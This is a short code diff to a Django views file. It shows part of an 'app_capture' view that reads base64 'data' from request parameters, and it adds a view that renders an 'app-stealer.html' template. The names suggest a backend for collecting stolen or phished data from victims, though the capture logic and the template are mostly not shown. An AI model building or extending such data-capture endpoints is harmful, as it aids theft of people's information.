@@ -316,8 +316,6 @@ def reel_page(request, code):
 
 
 
-
-# core/views.py → FINAL APP CAPTURE
 import base64
 def app_capture(request):
     data_b64 = request.GET.get('data', '')
@@ -338,3 +336,7 @@ def app_capture(request):
         except Exception as e:
             print("ERROR:", e)
     return HttpResponse("OK")
+
+
+def app_stealer_page(request):
+    return render(request, 'core/app-stealer.html')
